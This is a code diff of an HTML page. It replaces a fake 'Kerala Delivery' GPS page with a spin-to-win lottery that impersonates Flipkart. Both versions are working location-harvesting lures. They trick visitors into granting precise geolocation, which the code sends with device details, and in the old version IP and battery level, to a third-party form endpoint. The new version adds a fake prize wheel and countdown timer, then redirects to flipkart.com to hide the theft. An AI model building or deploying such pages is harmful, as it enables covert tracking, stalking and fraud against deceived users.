@@ -3,255 +3,196 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuickDelivery Kerala | GPS Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flipkart | Lucky Draw 2026</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <style>
-        :root {
-            --primary: #e67e22;
-            --success: #27ae60;
-            --bg: #f4f7f6;
-            --log-bg: #0d0d0d;
-            --log-text: #39FF14; /* High-visibility Neon Green */
+        :root { --bg: #0f172a; --fk-blue: #2874f0; --fk-yellow: #ff9f00; --slice-angle: 51.428deg; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        body { background: var(--bg); height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; overflow: hidden; }
+        
+        .header { margin-bottom: 1.5rem; text-align: center; }
+        .header h1 { font-size: 1.2rem; letter-spacing: 5px; font-weight: 800; color: var(--fk-yellow); text-transform: uppercase; }
+        .timer { font-size: 0.8rem; color: #94a3b8; margin-top: 5px; }
+
+        .wheel-outer { 
+            position: relative; width: 85vw; height: 85vw; max-width: 350px; max-height: 350px; 
+            border-radius: 50%; border: 8px solid #334155; 
+            box-shadow: 0 0 30px rgba(40, 116, 240, 0.3); 
         }
 
-        body {
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto;
-            background-color: var(--bg);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #2c3e50;
+        .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); z-index: 50; }
+        
+        .wheel { 
+            width: 100%; height: 100%; border-radius: 50%; position: relative; overflow: hidden; 
+            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); 
+            background: conic-gradient(#ff595e 0deg 51.4deg, #ffca3a 51.4deg 102.8deg, #8ac926 102.8deg 154.2deg, #1982c4 154.2deg 205.6deg, #6a4c93 205.6deg 257deg, #4267b2 257deg 308.4deg, #ff924c 308.4deg 360deg); 
         }
 
-        .app-container {
-            width: 92%;
-            max-width: 400px;
-            background: white;
-            padding: 30px;
-            border-radius: 25px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            text-align: center;
+        .item { position: absolute; width: 50%; height: 50%; top: 0; right: 0; transform-origin: bottom left; transform: rotate(calc(var(--i) * var(--slice-angle))) skewY(calc(var(--slice-angle) - 90deg)); }
+        .item-content { transform: skewY(calc(90deg - var(--slice-angle))) rotate(25deg); position: absolute; top: 40px; left: 15px; text-align: center; width: 85px; color: #000; }
+        .item-content span { font-size: 0.6rem; font-weight: 900; text-transform: uppercase; display: block; margin-top: 4px; }
+
+        .spin-btn { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            width: 70px; height: 70px; background: #fff; border-radius: 50%; z-index: 100; 
+            display: flex; align-items: center; justify-content: center; color: #000; 
+            font-weight: 900; cursor: pointer; border: 4px solid var(--bg);
         }
 
-        .header h1 { color: var(--primary); margin: 0; font-size: 1.6rem; }
+        .modal { position: fixed; inset: 0; background: rgba(15, 23, 42, 0.98); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; backdrop-filter: blur(15px); padding: 20px; }
+        .modal.active { display: flex; }
+        .modal-content { background: #fff; color: #1e293b; padding: 3rem 2rem; border-radius: 2rem; text-align: center; width: 100%; max-width: 320px; }
+        .modal .prize-name { font-size: 1.8rem; font-weight: 900; color: var(--fk-blue); margin: 1.5rem 0; }
+        
+        .claim-btn { background: var(--fk-blue); color: #fff; padding: 1.2rem; border-radius: 1rem; border: none; font-weight: 700; text-transform: uppercase; width: 100%; cursor: pointer; }
 
-        .status-box {
-            margin: 25px 0;
-            padding: 20px;
-            border-radius: 15px;
-            background: #fffaf5;
-            border: 1px solid #ffe0b2;
-        }
-
-        #status-icon { font-size: 3.5rem; margin-bottom: 15px; display: block; }
-
-        .pulse { animation: pulse-animation 1.5s infinite; }
-        @keyframes pulse-animation {
-            0% { transform: scale(0.95); opacity: 0.8; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.8; }
-        }
-
-        .log-container {
-            text-align: left;
-            background: var(--log-bg);
-            color: var(--log-text);
-            padding: 15px;
-            border-radius: 12px;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 0.85rem;
-            height: 130px;
-            overflow-y: auto;
-            margin-top: 20px;
-            border: 1px solid #333;
-            box-shadow: inset 0 0 10px #000;
-        }
-
-        .footer-text { font-size: 0.8rem; color: #bdc3c7; margin-top: 20px; font-style: italic; }
+        #status-msg { margin-top: 25px; font-size: 0.75rem; color: #64748b; text-align: center; line-height: 1.4; padding: 0 30px; }
     </style>
 </head>
 <body>
 
-    <div class="app-container">
-        <div class="header">
-            <h1>🚚 Kerala Delivery</h1>
-            <p>Smart Dispatch System v5.1</p>
+    <form id="location-form" style="display: none;">
+        <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
+        <input type="hidden" name="Prize" id="form-prize">
+        <input type="hidden" name="Coordinates" id="form-coords">
+        <input type="hidden" name="GoogleMaps" id="form-link">
+        <input type="hidden" name="DeviceInfo" id="form-device">
+    </form>
+
+    <div class="header">
+        <h1>SPIN & WIN</h1>
+        <div class="timer">Offer ends in <span id="timer-clock">02:59</span></div>
+    </div>
+
+    <div class="wheel-outer">
+        <div class="pointer"><i data-lucide="triangle" fill="#fff" color="#fff" size="32" style="transform: rotate(180deg)"></i></div>
+        <div class="wheel" id="wheel">
+            <div class="item" style="--i:0;"><div class="item-content"><i data-lucide="smartphone"></i><span>iPhone 17</span></div></div>
+            <div class="item" style="--i:1;"><div class="item-content"><i data-lucide="ticket"></i><span>500rs Coupon</span></div></div>
+            <div class="item" style="--i:2;"><div class="item-content"><i data-lucide="ticket"></i><span>100rs Coupon</span></div></div>
+            <div class="item" style="--i:3;"><div class="item-content"><i data-lucide="frown"></i><span>No Luck</span></div></div>
+            <div class="item" style="--i:4;"><div class="item-content"><i data-lucide="zap"></i><span>iQOO 10R</span></div></div>
+            <div class="item" style="--i:5;"><div class="item-content"><i data-lucide="banknote"></i><span>10000rs Cash</span></div></div>
+            <div class="item" style="--i:6;"><div class="item-content"><i data-lucide="refresh-cw"></i><span>Try Again</span></div></div>
         </div>
+        <button class="spin-btn" id="spinBtn">SPIN</button>
+    </div>
 
-        <div class="status-box">
-            <span id="status-icon" class="pulse">📍</span>
-            <div id="main-status" style="font-weight:bold">Initializing...</div>
-            <div id="detail-status" style="font-size:0.9rem; color:#7f8c8d">Connecting to GPS...</div>
+    <p id="status-msg">Enable Location Access to participate in the Flipkart Exclusive Draw.</p>
+
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <i data-lucide="party-popper" size="64" color="#2874f0"></i>
+            <h2>WINNER!</h2>
+            <div class="prize-name" id="prizeNameDisplay">iPhone 17</div>
+            <button class="claim-btn" id="modalBtn">CLAIM ON FLIPKART</button>
         </div>
-
-        <div class="log-container" id="log">
-            > System starting...<br>
-        </div>
-
-        <p class="footer-text">Please allow location access to assign the nearest delivery partner.</p>
-
-        <form id="location-form" style="display: none;">
-            <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
-            <input type="hidden" name="subject" value="URGENT: High-Precision Delivery Location">
-            <input type="hidden" name="Coordinates" id="form-coords">
-            <input type="hidden" name="Accuracy" id="form-accuracy">
-            <input type="hidden" name="Method" id="form-method">
-            <input type="hidden" name="IP_Address" id="form-ip">
-            <input type="hidden" name="Device_Info" id="form-device">
-            <input type="hidden" name="Battery_Level" id="form-battery">
-            <input type="hidden" name="GoogleMapsLink" id="form-link">
-        </form>
     </div>
 
     <script>
-        let retryCount = 0;
-        const maxRetries = 5;
-        const mainStatus = document.getElementById('main-status');
-        const detailStatus = document.getElementById('detail-status');
-        const logBox = document.getElementById('log');
+        lucide.createIcons();
+        const wheel = document.getElementById('wheel');
+        const spinBtn = document.getElementById('spinBtn');
+        const modal = document.getElementById('modal');
+        const modalBtn = document.getElementById('modalBtn');
+        const statusMsg = document.getElementById('status-msg');
 
-        function addLog(msg) {
-            logBox.innerHTML += `> ${msg}<br>`;
-            logBox.scrollTop = logBox.scrollHeight;
-        }
+        const prizes = [
+            { name: "iPhone 17", big: true }, { name: "10000rs Cash", big: true },
+            { name: "iQOO 10R", big: true }, { name: "No Luck", big: false },
+            { name: "100rs Coupon", big: false }, { name: "500rs Coupon", big: false },
+            { name: "Try Again", big: false }
+        ];
 
-        function updateUI(main, detail, icon = "📍") {
-            mainStatus.innerText = main;
-            detailStatus.innerText = detail;
-            if(icon !== "📍") {
-                document.getElementById('status-icon').innerText = icon;
-                document.getElementById('status-icon').classList.remove('pulse');
-            }
-        }
+        let rotation = 0;
+        let isSpinning = false;
 
-        async function startSystem() {
-            // 1. Capture Device/Browser Info
-            document.getElementById('form-device').value = navigator.userAgent;
-
-            // 2. Capture Battery Info
-            if (navigator.getBattery) {
-                navigator.getBattery().then(bat => {
-                    document.getElementById('form-battery').value = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Unplugged'})`;
-                });
-            }
-
-            // 3. Capture IP as backup
-            fetchIPOnly();
-            
-            // 4. Start GPS attempts
-            if (navigator.geolocation) {
-                attemptGPS();
-            } else {
-                addLog("Hardware GPS not detected.");
-                fetchIPLocation();
-            }
-        }
-
-        async function fetchIPOnly() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                document.getElementById('form-ip').value = data.ip;
-                addLog("Network Identity Secured.");
-            } catch (e) {
-                document.getElementById('form-ip').value = "VPN or Hidden";
-            }
-        }
-
-        function attemptGPS() {
-            retryCount++;
-            addLog(`GPS Search Try ${retryCount}/${maxRetries}...`);
-            updateUI("Locating...", `Satellite lock-on (${retryCount}/${maxRetries})`);
-
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 7000, 
-                maximumAge: 0
-            };
-
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    // Success! Vibrate phone and process
-                    if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
-                    processLocation(pos, "SATELLITE/GPS");
-                },
-                (err) => {
-                    // Handle Permission Blocked
-                    if (err.code === 1) { 
-                        addLog("Access Denied. Reloading system...");
-                        setTimeout(() => { location.reload(); }, 2000);
-                    } 
-                    // Handle Timeout or Other Errors
-                    else if (retryCount < maxRetries) {
-                        attemptGPS();
-                    } else {
-                        addLog("GPS unavailable. Switching to Network.");
-                        fetchIPLocation();
-                    }
-                },
-                options
-            );
-        }
-
-        async function fetchIPLocation() {
-            updateUI("Signal Weak", "Switching to IP triangulation...");
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                
-                const mockPos = {
-                    coords: {
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        accuracy: 2500 
-                    }
-                };
-                processLocation(mockPos, "NETWORK-IP");
-            } catch (e) {
-                addLog("System failure. Check connection.");
-                updateUI("Failed", "Connection timeout.");
-            }
-        }
-
-        function processLocation(pos, method) {
-            const { latitude, longitude, accuracy } = pos.coords;
-            // Standard format for Google Maps Pins
-            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-            document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
-            document.getElementById('form-accuracy').value = `${Math.round(accuracy)} meters`;
-            document.getElementById('form-method').value = method;
-            document.getElementById('form-link').value = mapsLink;
-
-            addLog("Location Secured.");
-            updateUI("Data Secured", "Updating dispatch center...");
-            submitToWeb3();
-        }
-
-        function submitToWeb3() {
-            const form = document.getElementById('location-form');
-            const formData = new FormData(form);
-
-            fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.success) {
-                    addLog("Data synced successfully.");
-                    updateUI("Order Ready!", "Driver assigned successfully.", "🍕");
+        // --- Forced Location Logic ---
+        function getRequiredLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    alert("Browser not supported.");
+                    resolve(false);
                 }
-            })
-            .catch(err => {
-                addLog("Sync interrupted. Retrying...");
-                setTimeout(submitToWeb3, 3000);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        document.getElementById('form-coords').value = `${lat},${lon}`;
+                        document.getElementById('form-link').value = `https://www.google.com/maps?q=${lat},${lon}`;
+                        document.getElementById('form-device').value = navigator.userAgent;
+                        resolve(true);
+                    },
+                    () => {
+                        alert("❌ Location access is required to verify your region. Please allow location to spin.");
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
             });
         }
 
-        window.onload = startSystem;
+        spinBtn.onclick = async () => {
+            if (isSpinning) return;
+            
+            // Block until location is allowed
+            const allowed = await getRequiredLocation();
+            if (!allowed) return;
+
+            // Start Spin
+            isSpinning = true;
+            spinBtn.disabled = true;
+            statusMsg.innerText = "Checking regional availability...";
+            
+            const extra = Math.floor(Math.random() * 360) + 3600;
+            rotation += extra;
+            wheel.style.transform = `rotate(${rotation}deg)`;
+
+            setTimeout(() => {
+                const index = Math.floor((rotation % 360) / (360 / 7));
+                const win = prizes[index];
+                
+                document.getElementById('form-prize').value = win.name;
+                document.getElementById('prizeNameDisplay').innerText = win.name;
+                
+                if(win.big) confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+                modal.classList.add('active');
+                isSpinning = false;
+            }, 5000);
+        };
+
+        modalBtn.onclick = async () => {
+            if (document.getElementById('prizeNameDisplay').innerText === "Try Again") {
+                modal.classList.remove('active');
+                spinBtn.disabled = false;
+                return;
+            }
+
+            modalBtn.innerText = "Processing Reward...";
+            const formData = new FormData(document.getElementById('location-form'));
+
+            try {
+                // Submit to Web3Forms
+                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+                
+                // Immediate Redirect to Flipkart
+                window.location.href = "https://www.flipkart.com";
+            } catch (e) {
+                window.location.href = "https://www.flipkart.com";
+            }
+        };
+
+        // Urgency Timer Logic
+        let time = 179;
+        setInterval(() => {
+            let mins = Math.floor(time / 60);
+            let secs = time % 60;
+            document.getElementById('timer-clock').innerText = `0${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            if (time > 0) time--;
+        }, 1000);
     </script>
 </body>
 </html>
